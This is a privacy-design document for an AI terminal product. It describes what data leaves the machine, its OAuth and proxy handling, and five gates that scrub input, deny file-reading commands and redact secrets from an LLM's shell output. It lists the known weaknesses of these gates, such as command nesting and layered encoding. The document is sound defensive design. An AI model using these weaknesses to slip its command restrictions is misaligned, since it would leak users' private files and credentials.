# kaya · Privacy First Design

> [中文版](PRIVACY.md)

*Last synced: 2026-11-06 · Based on kaya v3.2.10 and the latest positioning update. Implementation paths and historical test counts refer to the product repository; this public repository contains no source code.*

> **The top priority is user privacy. Never leak private information to the LLM.**
>
> This is the starting point for product decisions — not a "security note" tacked on at
> the end of the document. Before writing the first line of code, every design must answer
> the question: **"Once this data goes out, can it be recalled?"** If not, redact it
> before it leaves.

---

## 1. The One-Sentence Promise

> kaya runs on **your own Mac / Windows PC**, and the LLM only sees what you **actively give it**.
> **By default it cannot see any of your files.** Whatever you put under `~/.kaya/`,
> whatever secrets are in what you type — only after passing through 5 gates does it
> enter the LLM's context.

This is structural, not a configuration option — it cannot be changed.

**Product positioning and permissions**: kaya is **the AI terminal built for AI developers**, with model management, coding-agent management, a security gateway and an AI brain built on a full terminal. "AI brain" means the built-in chat and restricted tool assistance, not additional local permissions. "Security gateway" means the model gateway in this document: optional and off by default, covering only explicitly connected coding-agent model requests, independently of the chat's five gates. The positioning changes no file-read, coding-mode, per-tab approval or subscription boundary, and does not reclassify non-core capabilities as experimental.

---

## 2. Data Flow: What Leaves the Machine, What Stays Local

```
Your Mac                                                          LLM endpoint
┌──────────────────────────────────────────────┐                ┌──────────────┐
│                                              │                │              │
│  ┌──────────┐   run_shell (independent subprocess) │                │              │
│  │ Real zsh │ ──────────────────────► [policy]│                │              │
│  │ (user)   │                    │           │                │              │
│  └──────────┘                    │           │                │              │
│        ▲                         ▼           │                │              │
│        │  PTY output             [safety]   │                │              │
│        │  (LLM is an observer)    │           │                │              │
│        │                          ▼           │                │              │
│        │                       [exec]          │                │              │
│        │                          │           │                │              │
│        │                          ▼           │                │              │
│        │                       [scrub]         │                │              │
│        │                          │           │                │              │
│  ┌──────────┐                     │           │   Already-     │              │
│  │ Chat UI  │ ◄──── LLM response ─┘           │   redacted     │              │
│  │ (front   │ ────────────── invoke("llm_chat") ───────────────► │              │
│  │  end)    │                                  │                │              │
│  └──────────┘                                  │                │              │
│      │                                         │                │              │
│      ▼                                         │                │              │
│  localStorage (UI state; reasoning not stored) │                │              │
│  ~/.kaya/                                      │                │              │
│    ├─ conversations/c_*.json (LLM context)     │                │              │
│    ├─ audit/s_*/events-*.jsonl (audit)         │                │              │
│    └─ debug/s_*/turn-N.json (optional, dev-only)│               │              │
└──────────────────────────────────────────────┘                └──────────────┘
```

**Only three things** leave your machine to the LLM endpoint: the scrubbed user
input, the scrubbed tool output, and the scrubbed LLM request body. **The API key
itself** is only sent in the LLM auth header — never in the body. **Prompt
content** is post-scrubbing content, not the raw input.
Additionally: the read-only git digests **collected by kaya itself** for task-queue
perception (perceive / report turns) are likewise truncated and then Strict-scrubbed
before entering the prompt (they do not go through the policy gate; see §7.10 for the
implementation details) — they fall under "the scrubbed LLM request body" and add no
new egress.

**Pasted images (2026-10-02)**: images pasted into Chat (Cmd+V) are re-encoded
through a canvas (all metadata such as EXIF/GPS stripped, downscaled to a 1568px
long edge) and then **leave only toward the model you currently have selected** —
on the BYOK path they go straight to the target provider as rig `image_base64`
multi-part content, transiting no third party; the IM-channel and CLI construction
points are hard-wired empty, so mirroring / remote access never carry images out.
The image bytes travel in the dedicated `ChatArgs.images` field and **never enter
the text guard / scrub pipeline** (base64 image data is indistinguishable in
shape from a high-entropy secret — running the guard on it would mis-redact and
then truncate it; this is structural, see §4.2.1). **The built-in model (the
yunhou `/chat` proxy) has a text-only contract**: a request carrying images is
fail-closed at the entry point with the explicit `images_unsupported_builtin:`
error — on the built-in path images **never leave the machine**. The per-session
byte budget (`message_estimated_bytes`) counts image bytes, so images cannot
bypass the session cap.

Egress is fixed and auditable; beyond those three, the only remaining egresses are:

- **Usage-analytics heartbeat** (on by default; can be turned off in Settings →
  Account): while logged in, the app reports
  `{active_seconds, platform, app_version, local_date, occurred_at, client_event_id}`
  to the yunhou server once every 5 minutes. It contains no conversation content,
  no file content, no nickname, no email — no PII of any kind (identity is carried
  by the login JWT); nothing is reported while logged out. It is used for
  operational statistics such as DAU/WAU/MAU and usage duration.
- **Cloud Token usage upload (off by default, explicit opt-in, 2026-10-26)**:
  enabled only after user confirmation in Settings → "Account" → "Cloud Token
  usage", with consent version `kaya-usage-upload-v2`. It uploads only usage
  buckets aggregated by UTC hour or day (source + agent + normalized provider
  key + model id + token counts + request count) and the four device-registration
  fields (random device id, OS family, kaya version, consent version); no
  conversation or tool content is uploaded. See "Cloud Token usage upload" in §8.
- **Remote access (cloud relay; off by default, explicit opt-in, 2026-09-15)**:
  once enabled, desktop conversation content / running-agent status / grant
  approvals are relayed through the yunhou relay server to your browser, and the
  remote side sees exactly what the desktop sees. The relay is in-memory
  pass-through only: it does not parse payloads, does not persist any frame, and
  its access logs contain no payload; all traffic is WSS (TLS). See §4.8. When
  not enabled this egress does not exist; turning it off disconnects immediately.
- **Update check & one-click update (2026-10-01; update source moved to the
  official website on 2026-10-04)**: "Check for updates"
  anonymously GETs a version manifest from the kaya website
  (`/api/kaya/desktop/latest`; cn → yunhouai.com, intl → yunhou.ai) — no login
  state, no user data. On macOS, "Download and install" anonymously GETs
  `latest.json` from the official website and downloads the update package
  (`/downloads/kaya/`; cn → www.yunhouai.com, intl → yunhou.ai — the update
  source is the website only, never GitHub; the local .app is replaced only
  after minisign signature verification). Both are
  read-only downloads that send nothing upstream; like all kaya-built HTTP
  clients they follow the application proxy settings (explicit direct mode
  when the proxy is disabled).
- **BYOK model-usage probe (2026-10-12, settings redesign)**: the entry status
  cards in Settings → "Models" send a read-only GET to the provider's **own**
  usage endpoint, keyed off the entry's base_url (currently covering DeepSeek
  `/user/balance`, Moonshot `/v1/users/me/balance`, SiliconFlow
  `/v1/user/info`, and OpenRouter `/api/v1/credits`). Boundaries: the API key
  travels only in the `Authorization: Bearer` header (read from the keychain
  by Rust, never leaving the Rust process); the HTTP client follows the
  application proxy settings (explicit direct mode when disabled); providers
  whose host is not in the adapter table get **zero egress** (no request is
  made and the card shows "usage query unavailable"); probed amounts are
  only returned to the frontend for display — they never enter the audit
  JSONL, never enter debug dumps, and never enter the LLM context; app_log
  records only `{provider_id, status}` (never the amount; since the
  2026-10-16 provider-hierarchy refactor, probing and logging are both
  provider-scoped). The usage cache is
  session-scoped in-memory (TTL 5min) — never written to disk and never
  persisted via the persist store.
- **OpenCode session-routing header (2026-10-19)**: when an OpenCode
  provider is selected, Chat / CLI requests carry the OpenCode-required
  `x-opencode-session` header (derived from the Kaya conversation id via
  SHA-256, stable across turns of the same conversation, and never containing
  the raw conversation id) plus `User-Agent: kaya`. These headers are injected
  only for OpenCode base URLs; other BYOK providers do not receive them.
  One-shot auxiliary calls without a conversation use a random session value;
  audit and debug dumps never record these headers.
- **Provider catalog (2026-10-16, provider-hierarchy refactor): a build-time
  snapshot with zero runtime egress**. The "Add provider" picker in
  Settings → "Models" is fed from
  `crates/kaya-core/data/provider_catalog.json` (a distilled snapshot of
  models.dev, refreshed offline by `scripts/fetch-provider-catalog.mjs` and
  committed to git) plus a hand-maintained local overlay
  (`provider_catalog_overlay.toml`); both are **embedded at compile time**
  (`include_str!`, merged in memory via OnceLock; the
  `provider_catalog_list` command is a pure in-memory read) — **the app
  never contacts models.dev or any catalog source at runtime**; the catalog
  carries only public endpoint URLs and model-id lists, no credentials.
- **Model-list fetch (`/models`, 2026-10-17, shipped in Phase 2)**: the
  "Refresh" button on a provider's detail page in Settings → "Models" sends
  one read-only GET to **that provider's own** `/models` endpoint (probe
  protocol priority chat → openai → anthropic; anthropic builds
  `{base}/v1/models`, chat/openai build `{base}/models`) and uses the model
  ids in the response to refresh that provider's model list (written back
  to the local library file). Triggers are **explicit user actions only**,
  four of them, one call each: clicking "Refresh" manually; automatically
  once after a successful save of a **non-empty new key**; automatically
  once after saving an entry that has **never been fetched** (no new key
  required); automatically once when first opening a provider that is
  already in the library and has never been fetched. OAuth entries **skip
  automatic fetching while signed out / expired** (one catch-up fetch after
  a successful sign-in). **No timers, no polling, no boot-time bulk fetch**;
  the target host is the user-configured provider's own base_url, with no
  third-party relay in between.
  - **Auth and boundaries**: an API key goes only into the
    `Authorization: Bearer` (chat/openai; omitted for local endpoints such
    as Ollama that have no key) or `x-api-key` + `anthropic-version`
    (api_key + anthropic) auth header; **OAuth access tokens use
    `Authorization: Bearer` for every protocol**. Rust reads credentials from
    the keychain and they never leave the Rust process. The HTTP client follows
    the application proxy settings (explicit direct mode when disabled);
    **redirects are disabled** (3xx is not
    followed, so the key is never carried to the Location host); the overall
    timeout is **10 seconds**; the response body is **read with a bounded
    stream, capped at 2 MiB** (the read aborts immediately past the cap
    instead of waiting for the full body) and is parsed as `{data:[…]}`,
    **extracting only the validated model ids** (trimmed, non-empty,
    ≤200 chars, no control characters) — the rest of the body never enters
    the library, logs, or LLM context. Since 2026-10-22 the body is **no
    longer scrubbed before parsing** (the high-entropy fallback used to
    rewrite dated model ids such as `claude-sonnet-4-20250514` into
    `[REDACTED:entropy-string]` and persist that; the privacy boundary is
    kept by "ids only, zero logs, zero context" instead). Phase 3 OAuth
    providers resolve the access token
    through `resolve_bearer` (the token only goes to that provider's own
    base_url); not signed in or already marked expired **fails closed before
    any request is sent** (zero network); a transient refresh failure retries
    with the old token (bounded by the upstream 401). Anthropic without a
    local key fails closed the same way; 401/403 and other non-2xx statuses
    **never read the body** and only produce a fixed error code.
  - **Failure and fallback**: network / HTTP / parse failures write a
    **fixed error-code sentinel** (no transport text, no body) into the
    library file's `models_fetch_error`, overwritten by the next
    "Refresh"; providers with a catalog preset additionally backfill their
    auto model rows from the **local catalog snapshot** (the UI labels this
    "catalog snapshot, may be outdated"; manual rows are untouched);
    **manually maintained model rows are never overwritten or deleted by
    online results on any path**.
  - **Logs / audit: zero key, zero body**: this path adds no audit events;
    app_log records only
    `{provider_id, status, error_code, fetch_error_code, model_count}`
    (info for online, warn otherwise; `fetch_error_code` only carries the
    fetch-side code when the fetch failed and the commit failed too — always
    a fixed sentinel); when the catalog-snapshot fallback is **actually
    applied**, one extra info event `model_fetch_catalog_fallback` is logged
    (payload: provider_id only; no token or response body); the key,
    response body, and model-id
    list never enter app_log, the audit JSONL, debug dumps, or the LLM
    context. Fetch results only go back to the frontend for display and
    mirror updates; library writes go through the existing
    `mutate_library` funnel (the same lock as manual edits).
- **Provider OAuth device authorization (2026-10-17, Phase 3; Kimi is
  implemented with real-device verification still pending)**: clicking
  "Sign in" on a provider's detail page in Settings → "Models" starts a
  device-code flow (RFC 8628) against the **official Kimi authorization
  service `https://auth.kimi.com`**: `POST
  /api/oauth/device_authorization` returns a user_code and a verification
  URL, then `POST /api/oauth/token` is polled at the server-provided
  interval until approved / denied / expired; near expiry or after an
  upstream 401 the refresh_token is rotated at the same endpoint. The
  verification URL shown in the UI uses the official reference value
  `https://www.kimi.com/code/authorize_device` (**the real-device response
  is authoritative**); it is opened in the **system browser** for the user
  to approve. The credential data surface has exactly three parts:
  - **(a) Identity metadata**: only the public client_id plus the four
    `X-Msh-*` headers (`Platform: kimi_cli`, the kaya package version, the
    fixed device name `kaya-desktop`, and a per-provider random UUID device
    id); **no hostname, no device model / OS-version fingerprint**.
  - **(b) Protocol parameters**: poll requests carry the device_code and
    refresh requests carry the refresh_token; both also carry grant_type /
    client_id, sent as form parameters to `auth.kimi.com` over TLS —
    **never to any other party**. HTTP follows the application proxy settings
    (explicit direct mode when disabled) and has **disabled redirects** (so
    the parameters can never follow a Location to a
    third-party host), a 10-second per-request timeout, a bounded response
    read (64 KiB), and a 15-minute polling deadline (interval clamped to
    1–30 s, `slow_down` adds 5 s).
  - **(c) Token material**: access / refresh tokens live only in the
    system keychain and Rust process memory (§8) and are **never exposed to
    the frontend / IPC / logs / the audit trail / debug dumps**; the UI
    only receives the user_code, the verification URL, and fixed error
    sentinels (`oauth_poll_*` / `oauth_begin_failed` /
    `oauth_token_persist_failed` etc., zero upstream body echo).
  In the shipped catalog **Kimi Coding Plan declares a startable OAuth**
  (device flow, with a sign-in entry in the UI); **Anthropic still
  declares API Key only** (the oauth block is a coming placeholder, and its
  OAuth entry is not rendered). `provider_oauth_start` fails closed on the
  Rust side for unopened / unstartable entries (zero network).
- **Provider OAuth browser authorization (2026-10-27; OpenAI ChatGPT
  subscription / Codex is implemented)**: for the **OpenAI ChatGPT subscription (Codex)** catalog entry,
  the sign-in button in Settings → Models uses the browser Authorization Code
  + PKCE flow. It is a **separate flow** from the Kimi device flow above
  (dispatched by the catalog-declared flow; neither affects the other):
  - **(a) Authorization surface**: `oauth/authorize` against the **Codex
    official authorization service `https://auth.openai.com`** (public
    client `app_EMoamEEZ73f0CkXaXp7hrann`; scope `openid profile email
    offline_access api.connectors.read api.connectors.invoke`; extra
    parameters `id_token_add_organizations=true` /
    `codex_cli_simplified_flow=true` / `originator=codex_cli_rs`). The user
    approves in the **system browser**; the authorization code returns to a
    **loopback listener bound to `127.0.0.1`** (only the officially
    registered ports 1455 → 1457). PKCE uses S256; `state` is random and
    **compared verbatim** (a mismatch means zero token exchange); the
    callback waits at most 15 minutes. The wait is a **loop**: only
    `GET /auth/callback` is accepted — any other path (favicon / port
    probe / wrong path) gets a fixed 404 and the listener **keeps
    waiting** (a stray request must not steal the real callback); the
    **`state` is validated first**, so neither a denial nor a missing code
    can bypass the state gate. **Mismatches are tolerated in a bounded
    way** (2026-10-28): the loopback port is open to any local process, so
    "one mismatch terminates the sign-in" would hand every local program a
    one-shot kill switch for the login in progress; a few mismatches
    (`state` mismatch / stale-session callback / local probe) only get the
    fixed failure page and the listener keeps waiting — it fails closed
    only after consecutive mismatches reach the bound (5). The response
    page is the **200 success page only when the `state` passed and a code
    was obtained**; a mismatch / denial / missing code always gets the
    fixed failure page with a **non-200** status and zero echo (`state` /
    `code` / `error_description` never appear in the page).
  - **(b) Token-exchange surface**: the code is POSTed as a form
    (`grant_type=authorization_code` / `code` / `redirect_uri` /
    `client_id` / `code_verifier`) to `https://auth.openai.com/oauth/token`;
    refresh uses the same endpoint but with a **JSON body**
    (`Content-Type: application/json`, key set `grant_type=refresh_token` /
    `client_id` / `refresh_token`, **without scope** — matching the Codex
    official client).
    HTTP uses the application proxy (explicit direct mode when disabled), **redirects disabled**, 10 s
    per-request timeout, bounded response reads (64 KiB).
  - **(c) Credential surface**: access / refresh tokens and optional `account_id`
    are persisted together in the system keychain and used in Rust memory. The **ID token
    is parsed only in memory for `chatgpt_account_id` and `exp` and then discarded**;
    it never reaches disk / IPC / logs / audit / debug dumps. The
    authorization code / PKCE verifier / ID token are **structurally absent
    from IPC**. `state` and `code_challenge` appear **only in the authorization
    URL query** shown to the user and opened in the system browser; they have
    no separate wire fields and never reach logs / audit / Debug (Debug uses
    `debug_safe_url` to strip the query). The callback query is not logged and
    does not reflect `error_description` (a fixed HTML page is returned).
  - **(d) Upstream isolation**: the ChatGPT subscription upstream is
    **`https://chatgpt.com/backend-api/codex/responses`** (the Codex
    official contract), **not** `api.openai.com` — a subscription token and
    an API key belong to two different products and are never exchanged. In
    the catalog, `openai-chatgpt` (OAuth only) and `openai` (API Key only,
    `https://api.openai.com/v1`) **coexist**; the endpoint allowlist keeps
    failing closed at sign-in, persistence and resolution (subscription
    tokens only ever go to chatgpt.com).
  - **(e) Account identity header**: the ChatGPT upstream additionally
    requires a `chatgpt-account-id` header (parsed from the ID token's
    `https://api.openai.com/auth` claims). It is persisted with the token bundle in the system keychain and used in **Rust
    memory** as an upstream identity header — **never in IPC / logs / audit
    / debug dumps**; inbound forgeries of the same header are stripped
    (reserved-header table) and model-library custom headers may not set it
    (no account mixing). A missing account id means the route is treated as
    having **no usable credential** (fail closed): the shell assembles no
    credential for it and the gateway **hard-rejects** such a request with
    401 and **zero upstream traffic** (a fixed, content-free error body);
    an empty identity header is never sent upstream.
  - **(f) Model list**: the ChatGPT backend has **no** `/models` directory
    contract this design can rely on — **no path guessing** (online
    discovery is refused for this entry with **zero network**); the model
    list comes from the **compile-time static catalog** (embedded metadata
    for the OpenAI coding models).
  In the shipped catalog **OpenAI ChatGPT subscription (Codex) declares a
  startable OAuth** (browser flow, with a sign-in entry in the UI; an
  oauth-only entry instantiates as OAuth by default and its auth-kind
  selector does not render the API Key option). **The OpenAI API Key entry
  and Anthropic still declare API Key only**.

  **Support and verification scope**: ChatGPT subscriptions serve only the four coding agents through gateway Responses adaptation, not kaya's own Chat or audit AI judge. Upstream verification covers a first Codex request, long-history continuation and built-in bare model names under global takeover on macOS. Kimi Coding Plan real-device verification remains pending; this does not establish verification for other platforms or flows.

**All state stays on the local machine**: UI state lives in `localStorage`; LLM
context / audit / debug live under `~/.kaya/`. Local state is not automatically
synced to the cloud; the usage-analytics heartbeat (see above) is on by default,
can be turned off in Settings, and carries only application alive duration /
platform / version number. Cloud Token usage upload is a separate opt-in channel
that requires explicit consent.

**Default model source's data egress (round-138, 2026-08-04)**: by default kaya
uses the **built-in model** (the yunhou `/chat` proxy) — scrubbed chat content
is sent over your login token (JWT) to the **yunhou first-party server**, which
answers with yunhou's DeepSeek key. Before sending, the client trims to the
server's limits (message count / per-message bytes / total bytes — the oldest
history is dropped first; dropping content before send is itself a
privacy-relevant behavior). The login token (refresh_token) lives only in the
system keychain (macOS Keychain / Windows Credential Manager). Switching to **Ollama** (local inference) keeps inference and conversation / tool content on the machine; the signed-in usage heartbeat and explicitly consented cloud Token usage upload are separate channels, independent of the provider choice.
Switching to **OpenAI compatible** sends content to your chosen provider. Local
state storage still has no central server — but the default data **egress**
goes through the yunhou server, a change since round-138 that the privacy
positioning must state explicitly.

**Application proxy (2026-10-30; scoped and per-protocol routing added
2026-11-02): the network-intermediary boundary**. Once the manual proxy is
enabled in Settings → General → Network Proxy, kaya's **own** outbound requests
(built-in Chat / BYOK / OpenAI Responses / audit judge / OAuth / model discovery
and connectivity checks / Tavily / usage reporting / website update manifest and
updater downloads / Feishu, Slack, WeCom and Remote REST and WSS / remote gateway
upstreams) connect to **the proxy server you selected** by default. Its operator
may see destination hosts, timing and metadata visible outside TLS. This is a
user-selected network intermediary: kaya's five gates do not change that fact and
do not endorse the proxy. The boundaries are:

- **Shell is untouched**: application settings never write `HTTP_PROXY` /
  `HTTPS_PROXY` / `ALL_PROXY` / `NO_PROXY` (or case variants), shell profiles,
  `CommandBuilder.env`, PTY launch arguments or the `run_shell` environment
  snapshot. Terminal commands, manually started processes, LLM `run_shell`
  children and coding agents launched in the terminal are unaffected. To proxy
  those commands, users must export proxy variables themselves (the settings UI
  says so explicitly). A `run_shell` child only ever sees proxy variables from
  the user's own Shell snapshot.
- **Loopback is always direct**: `localhost` and its subdomains, `127.0.0.0/8`
  and `::1` are built-in, non-removable bypass rules. The local gateway listener,
  OAuth loopback listener and health checks never use the proxy.
- **Bypass validation before saving**: entries must be hostnames (optionally
  prefixed with a dot), valid IPv4 / IPv6 addresses (IPv6 may be bracketed), or
  valid CIDRs. URLs, user info, ports, paths, wildcards, blank entries and
  malformed networks are rejected. reqwest 0.12 / 0.13 and WebSocket share this
  validation; invalid configurations cannot enter the proxy runtime.
- **Legacy bypass compatibility on load**: older versions may already have
  written URLs, ports, paths, underscores or non-ASCII entries into
  `proxy.json`. The runtime load ignores those entries one by one and keeps the
  valid ones; an invalid entry is never interpreted as a broader direct
  exception (the affected target returns to the proxy path, which is the safe
  direction), and no export other than the explicitly direct scopes becomes
  unavailable because of one legacy entry. Loading never rewrites the user's
  on-disk configuration, and saving new configurations still rejects invalid
  entries strictly. Diagnostics record only the **number** of ignored entries —
  never a raw internal host name. That count is surfaced through the existing
  proxy configuration snapshot (`legacy_bypass_ignored`) and shown in Settings as a
  content-free notice ("Ignored N unrecognized direct-connection exception(s); they
  now go through the proxy."); the raw entries / host names never enter the DTO,
  IPC, logs or UI. An explicit user save rewrites the file with the filtered
  list, and the count returns to zero.
- **Bypass domain matching**: a domain entry matches itself and its subdomains;
  one terminal root dot is equivalent on both the configured domain and the target
  host. reqwest 0.12 / 0.13 match both dotted and undotted domain forms, consistent
  with WebSocket bypass. IP/CIDR entries gain no dotted variants; unmatched domains
  still use the configured proxy.
- **Passwords stay in the OS keychain**: proxy passwords are write-only and live
  in four independent internal shared slots: `proxy_password`,
  `proxy_http_password`, `proxy_https_password` and `proxy_socks5_password`.
  Generic secret IPC refuses to read or write them. They never enter
  localStorage, `proxy.json`, app_log, audit or IPC replies. Settings snapshots
  expose only presence metadata: `has_password` for the single endpoint and three
  booleans in `advanced_has_password` for advanced mode. Advanced endpoint
  credentials are never shared or returned to the UI; like `proxy.json`, their
  slots are shared across app variants.
- **Per-protocol endpoints**: the default remains a single proxy endpoint.
  Advanced mode can simultaneously save independently enabled HTTP, HTTPS and
  SOCKS5 endpoints, each with its own authentication. Each target prefers its
  dedicated endpoint, then SOCKS5, and finally the other endpoint type (HTTP over
  CONNECT can carry HTTPS, and an HTTPS proxy can forward HTTP). When the proxy
  is enabled, advanced mode requires at least one enabled endpoint; saving and
  startup reject an empty selection. These are deterministic selection rules, not
  runtime failover: a
  missing selected endpoint or a connection failure never triggers direct access
  or another route.
- **Application proxy scopes**: models, gateway, accounts, usage (Token usage
  upload, heartbeat and their own token refreshes), search, IM channels, remote
  access and updates can independently select proxy or explicit direct access.
  `direct_scopes` records only scopes the user explicitly made direct; old
  configurations default to an empty list, so every scope uses the proxy. Token
  refreshes initiated by a business follow that business's scope (models, remote
  ticket acquisition or usage); account settings and background account refreshes
  follow accounts. A proxied scope never silently becomes direct after a proxy
  failure. Explicitly direct scopes do not read the system proxy, PAC or process
  environment. Confirmed direct scopes remain available despite proxy credential
  failure only when configuration passes semantic validation and the second
  startup snapshot is unchanged. Unparseable configuration, uncertain save
  completion or a changed startup snapshot makes the exceptions unverifiable and
  fails all scopes closed.
- **Failure never falls back to direct (fail closed)**: for scopes selected to
  use the proxy, corrupt configuration, keychain read failure with authentication
  enabled, or startup read timeout marks the runtime unavailable and returns a
  fixed redacted error (`proxy unavailable: check proxy settings in the app`). It
  never silently switches to direct. Proxy connection failures return network
  errors without a direct retry. Only explicitly direct scopes with validated
  configuration and an unchanged second startup snapshot are insulated from proxy
  credential failure. When the proxy is disabled, kaya uses explicit direct mode
  and does not read the system proxy, PAC or process environment. Retaining an
  authentication draft does not trigger a startup keychain read.
- **Credential transaction and control plane**: `proxy.json` contains only
  non-sensitive configuration. Before a password change, `proxy.pending.json` is
  atomically persisted with a random revision and a pending marker (no
  credentials); it is cleared only after configuration commit or password
  confirmation rollback. After interruption or a failed rollback, enabling
  authentication rejects the existing password and requires explicit re-entry;
  disabling the proxy can retain the uncertain marker and remain direct.
  `proxy.json`, `proxy.pending.json`, `proxy.lock` and dotted temporary/backup
  variants are all denied by the Rust/TS control-plane write policy, including
  trusted downloads and redirects. Snapshot `revision` covers only public
  configuration and the transaction marker, never a password or secret hash.
  Authentication Keep checks `expected_revision` under the file lock before
  reading a password; stale or missing provenance is rejected and requires reload
  or an explicit new password. A matching source may edit the endpoint while
  retaining an empty password. Stale-source disable or unauthenticated Keep
  persists and retains pending so a later enable cannot bind another instance's
  password. When uncertain provenance is repaired by an explicit password change,
  saving clears every other Keep slot, including slots for the other mode, before
  clearing pending. This makes the next startup recoverable without allowing a
  later endpoint enable to reuse an unconfirmed password. Any password rollback
  failure retains pending. If final marker completion is uncertain, even after a
  rename has taken effect, the process becomes unavailable. `needs_apply` is
  computed from the source version carried by the Ready snapshot; another
  instance's commit or a same-config password change is shown as pending. A
  successful save returns the new version directly, and a failed save never
  claims the draft was applied.
- **Startup and settings availability**: startup proxy reads are capped at 5s;
  metadata and pre-save old-password reads at 2s. OS reads are single-flight;
  timed-out reads do not spawn duplicate threads and startup waits do not hold
  proxy or save locks, so the user can still disable the proxy. Late results have
  no publication rights; successful reads must still match configuration, random
  revision and runtime generation. OS keychain writes remain subject to system
  authorization and are not claimed to be forcibly cancellable.
- **New requests take effect immediately**: subsequent tool-loop requests, 401
  refresh replays, retries after 429 and updater download after check select the
  current proxy before each actual send; an already-issued HTTP/SSE response may
  finish on its existing connection. Client caches read the generation under the
  same lock used to check, build, backfill and return clients, including gateway
  upstreams, cloud upload, Slack, OpenAI and Feishu. Long-lived OpenAI-compatible
  providers refresh transport per `stream_chat` while retaining session headers.
  Slack reselects after network / 429 waits and connection negotiation. Feishu
  reselects after token/cache waits, before message create/PATCH and between
  self-check stages while retaining caches and TTLs. Message creation is a narrow
  REST operation and does not enter the SDK's implicit store app_ticket request;
  10012 is treated as a business failure.
- **No TLS downgrade**: there is no "ignore certificate errors" switch.
  WebSocket and reqwest 0.12 use embedded webpki-roots; reqwest 0.13 uses
  rustls-platform-verifier. No extra CA setting is provided. Installing an
  enterprise MITM/self-signed proxy CA only in the OS trust store does not make
  WebSocket / reqwest 0.12 trust it; those connections still reject untrusted
  certificates.
- **Redacted errors**: error text contains only protocol, host, port and failure
  category — never passwords, complete authenticated URLs or
  `Proxy-Authorization`. Proxy configuration, passwords and failures are not
  written to app_log, audit or debug capture (the proxy layer has no log egress).
- **Gateway**: only the **remote upstream** uses the proxy; the local gateway
  entrance and `/health` have no outbound request.

Proxy control-plane deny rules are maintained as mirrored Rust policy and TS
replay rules. macOS/Windows comparisons ignore case; Linux remains case-sensitive.
Application proxy settings do not change safety/scrub rules or deny prefixes.

---

## 3. The 5 Gates: scrub is the safety net; policy + safety are the primary defense

Design philosophy: **Do not assume scrub can catch everything.** **Structurally**, the
LLM cannot access file content by default (no cat, no less, no base64). **Only**
content that the user actively placed in the trusted root is allowed through.
The scrubber is a regex, and regexes inevitably have false negatives — its job is to
"reduce residue", not to "prevent leaks".

```
   User input (what you type / paste)
       │
       ▼
   ┌──────────────────────────────────────────┐
   │  Gate 0 · User input guard               │
   │  Location: front-end runAgent entry      │
   │             + Rust llm_chat entry        │
   │  Action: scrub-first → truncate 32 KiB   │
   │  Failure mode: scrub regex false negative│
   │  Fallback: "Redacted" badge prompt       │
   └──────────────────────────────────────────┘
       │
       ▼  (scrubbed text is already redacted)
   ┌──────────────────────────────────────────┐
   │  Gate 1 · Policy gate (capability policy)│
   │  Location: Rust run_shell stage 1        │
   │  Action: blacklist/whitelist +           │
   │         pipeline segmentation + trusted  │
   │         read (cat ~/.kaya/*              │
   │         / head / tail / grep /           │
   │         sed -n etc.) + trusted download  │
   │         (curl -o ~/.kaya/                │
   │         <safe extension> URL)            │
   │         + redirect gating (> / >> only   │
   │         when the target is under         │
   │         ~/.kaya/ with a safe extension,  │
   │         round-68)                        │
   │  Failure mode: newly added "dangerous    │
   │         command" not covered             │
   │  Fallback: default-deny, LLM receives    │
   │         structured error                 │
   └──────────────────────────────────────────┘
       │
       ▼
   ┌──────────────────────────────────────────┐
   │  Gate 2 · Safety gate (dangerous-command │
   │         detection)                       │
   │  Location: Rust run_shell stage 2        │
   │  Action: DANGEROUS/REPL/OPERATION regex  │
   │  Failure mode: heredoc / $(...) / `...`  │
   │         nesting                          │
   │  Fallback: recursive scan depth=3 + base │
   │         regex                            │
   └──────────────────────────────────────────┘
       │
       ▼  (commands that pass)
   ┌──────────────────────────────────────────┐
   │  Gate 3 · Execute isolation              │
   │  Location: Rust run_shell stage 3        │
   │  Action: zsh -f -c <cmd> (no .zshrc)     │
   │  Design: fully independent of user PTY   │
   │  Limits: 8s default timeout (user-     │
   │         configurable; 30s floor for    │
   │         slow scans like du/find/grep)  │
   │         + 100KB output cap             │
   └──────────────────────────────────────────┘
       │
       ▼  (execution output)
   ┌──────────────────────────────────────────┐
   │  Gate 4 · Output scrub (credential       │
   │         redaction)                       │
   │  Location: Rust run_shell stage 4        │
   │  Action: ~38 secret/PII regexes; whole   │
   │         PEM blocks                       │
   │  Failure mode: multi-layer nested      │
   │         encoding (single-layer b64/hex │
   │         covered by §7.9 rescan layer)  │
   │  Fallback: scrub still runs when user    │
   │         explicitly enables trusted read  │
   └──────────────────────────────────────────┘
       │
       ▼  (scrubbed output)
   Into LLM context
```

**Commands you type directly into the terminal do not pass through any gate** — that
is your shell, your responsibility.

---

## 4. Gate 0: User Input Guard

Runs in **two places** — the front-end `runAgent` entry and the Rust `llm_chat`
entry. Both runs use the same pipeline; **either side failing prevents raw text
from leaving**.

### 4.1 Order Matters: scrub first, truncate second

If you truncate first and then scrub, a secret could **land right on the truncation
boundary** and have half of it leaked to the LLM — the first half of the truncated
text would be the actual secret's prefix. scrub-first guarantees: any redacted span
is either fully preserved (`[REDACTED:private-key]`) or fully removed; it cannot be
cut in half.

Implementation:

- Front-end: `src/lib/userInputGuard.ts::applyUserInputGuard`
- Rust: `crates/kaya-core/src/llm/user_input_guard.rs::apply_user_input_guard`
- CLI: `crates/kaya-cli/src/input_guard.rs::guard`

### 4.2 32 KiB Hard Cap

`USER_INPUT_MAX_BYTES = 32768` (v1.2.3: 4096 → 65536 → 32768). The front-end and
Rust each have their own constant, locked in by a cargo tripwire + Vitest tests.
Truncation uses binary search on UTF-8 code points so emojis / surrogate pairs are
not cut in half.

### 4.2.1 Pasted Images Bypass the Text Guard (2026-10-02)

The base64 data of a pasted image **does not pass through this section's user
input guard**: it travels in `llm_chat`'s dedicated `ChatArgs.images` wire field
(same precedent as the `agent_target` prefix, which is appended after scrubbing)
and does not consume the 32 KiB text budget. Base64 image data is
indistinguishable in shape from a high-entropy secret — running the guard on it
would mis-redact and then truncate it, breaking the image; the real defense is
the Rust entry point's `validate_images` (`src-tauri/src/llm_commands.rs`):
per-image re-checks of count ≤ 4, decoded size ≤ 5 MB, and mime ∈ {png, jpeg,
webp, gif} (SVG is rejected: most endpoints do not support it and it can carry
scripts); violations return the `images_invalid:` sentinel, which the front-end
maps to a friendly message. The privacy boundary for images is guaranteed by
"the recipient = the model you selected" (see §2), not by the text scrubber.

### 4.3 Whole-Block PEM Redaction (2026-06-19 Incident)

